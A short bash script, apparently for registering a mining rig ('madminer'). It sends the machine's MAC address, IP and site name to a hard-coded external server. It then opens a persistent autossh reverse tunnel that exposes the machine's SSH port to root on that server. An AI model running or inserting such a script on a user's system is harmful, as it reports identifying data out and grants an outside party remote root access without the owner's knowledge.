#!/bin/bash
ifnames=`ifconfig | awk -F'[ :]+' '!NF{if(eth!=""&&ip=="")print eth;eth=ip4=""}/^[^ ]/{eth=$1}/inet addr:/{ip=$4}'`
# echo $ifnames 
for i in $ifnames; do
    if [ "$i" != "lo" ];then
        ifname=$i 
        break 
    fi
done
echo $ifname 
mac=`ifconfig $ifname | awk '/ether/{print $2}'`
echo $mac
ip=`ifconfig $ifname | awk '/inet /{print $2}'`
echo $ip
if [ ! -f /root/SiteBind.txt ];then
   echo "madminer" > /root/SiteBind.txt
fi	
sed -i 's/[[:space:]]//g' /root/SiteBind.txt
site=`cat /root/SiteBind.txt`
echo $site
curl -X POST http://47.108.224.218:9103/machine/${mac}/${ip}/${site} > temp.log
sleep 1
port=`cat temp.log`
echo $port 
mport=`expr ${port} + 1`
autossh -M $mport -fCNR $port:localhost:22 root@47.108.224.218



sed -i 's,backend-altchain.default:9101,127.0.0.1,g' js/app.024e82c7.js.map